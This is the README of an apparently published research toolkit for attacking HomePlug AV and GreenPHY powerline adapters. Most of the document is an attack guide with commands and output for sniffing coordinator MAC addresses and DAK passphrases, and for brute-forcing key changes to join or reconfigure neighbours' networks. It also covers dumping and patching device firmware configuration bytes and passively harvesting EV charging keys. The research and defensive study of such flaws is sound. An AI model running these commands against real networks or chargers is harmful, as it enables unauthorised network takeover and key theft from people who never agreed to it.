HomePlugPWN
===========

- HomePlugAV PLC tools presented at NoSuchCon 2014: http://www.nosuchcon.org/talks/2014/D1_03_Sebastien_Dudek_HomePlugAV_PLC.pdf
- Tools on HomePlug GreenPHY have been presented during SSTIC 2019 about V2G Attacks : https://www.sstic.org/media/SSTIC2019/SSTIC-actes/v2g_injector_playing_with_electric_cars_and_chargi/SSTIC2019-Article-v2g_injector_playing_with_electric_cars_and_charging_stations_via_powerline-dudek.pdf

## Requirements 
- Python >= 3.x
- Scapy v2.x
- Promiscous mode for Sniff Indicate packets

## Tools

- HomeplugAV.py scapy Layer: create and craft your own HomePlugAV packets
- discover.py: sends 'GetDeviceTypeRequest' in broadcast to discover PLCs of the same AVLN
- genDAK.py: derives MAC address to get a Qualcomm DAK passhrase
- PBKDF1.py: hashes the DAK or NMK passhrase using the PBKDF1
- quickKODAK.py: performs a KODAK bruteforce on powerline
- plcmon.py: enables 'Sniffer mode' and uses Sniffer Indicate packet to retrieve CCos MAC address
- PIBdump.py: dumps your entire PLC configure (PIB) into a file
- patchPIB.py: patch arbitrary bytes of your PLC, or a field between bytes 0x0-0x400 (see the details of ModulePIB conditions in the Scapy layer). 
- HPGPKeysCollect.py: parse HPGP messages and collect keys

## Efficient remote attack quick guide

First we plug our device to the powerline and sniff for every possible CCo:

```bash
python3 plcmon.py 
[+] Enabling sniff mode
Sent 1 packets.
[+] Listening for CCo station...
	 Found CCo: 44:94:fc:56:ff:34 (DAK: RMHT-ILPO-TYMN-IIXY)
         [...]
```

The tool recovers also the DAK passphrase directly. 

Too change the NMK of the CCos to have a chance to connect to neighbor(s) LAN, we can send the SetEncryptionKeyRequest to the CCos:

```bash
python3 quickKODAK.py -i eth0 -t 4494fc56ff34
Sent 1 packets.
``` 

If you want to reconfigure all device, skip 2-3 of the MAC address found previously as follows:

```bash
python3 quickKODAK.py -i eth0 -t 4494fc56
Sent 1 packets.
```

This will bruteforce the 2 last bytes, generating a new DAK and sending it in broadcast for every combinaison.

## Dump the entire PIB

The following tool aims to dump the entire PIB. You could also use the same techniques to dump the NVM or the Soft-Bootloader...

To process the dump use it as follows:

```bash
python3 ./PIBdump.py -i enp0s26u1u1 -o mycpl.pib
[...]
[+] PIB dump: Success!
```

A file containing your PLC Programmable Information Blocks (PIB) should be created as follows:

```bash
wc -c mycpl.pib 
16440 mycpl.pib
```

## Patch your PIB

If you want to change your MAC address for example, you can specify the Scapy attribute to modify and its new value:

```bash
python3 patchPIB.py -i enp0s26u1u1 -d <dest. MAC addr> -t "PIBMACAddr" -v "c0:ff:ee:c0:ff:ee"
```

The MAC address should be changed after that for your targeted device. But if the addresses are read-only for this device, you have to hack a little bit to reflash it correctly.

Nevertheless, if you want to change any arbitrary byte use this command as follows:

```bash
 python3 patchPIB.py -i enp0s26u1u1 -d <dest. MAC addr> -a <start_addr>:<len> -v <value>
```

Like this, you can rewrite the tone map and any other field of your choice ;)

## Collecting HomePlug GreenPHY keys from SLAC procedure

The standard is vulnerable to passive attack, letting an attacker to collect keys during a SLAC procedure.

The tool `HPGPKeysCollect.py` implements the passive attack to collect keys from a capture, or by sniffing the local PLC interface as follows:

```bash
python3 HPGPKeysCollect.py -i eth0
[...]
Sniffing on interface 'eth0'
[...]
[+] New keys collected for NetID ('\x45\x00\x23\x34\x76\x34\x01')
{'EVID': '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xcc',
 'EVSEID': '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
 'NMK': 'YT\xe2\x1e\x45\xf4\x23\x00E\x34\x45\xe7\xc2\x34',
 'RunID': '\x12BA\xee\xff\xe1\x36\x09'}
```

Please note that at least byte `0x1653` of the PLC should be set to '1' to get it work.

## Licence

HomePlugPWN tools including the HomePlugAV scapy Layer are under the **GPLv2**

## Problems?

- Give us your feedback ;)

## Acknowledgements

* Xavier Carcelle for his book (Power Line Communications in Practice), and his Framework FAIFA
* Ben Tasker for finding CCos MAC addresses in Sniff Indicate packets
* Open-PLC-Utils : https://github.com/qca/open-plc-utils
* Netgear and TP-Link utilities
* Homeplug AV and IEEE 1901: A Handbook for PLC Designers and Users
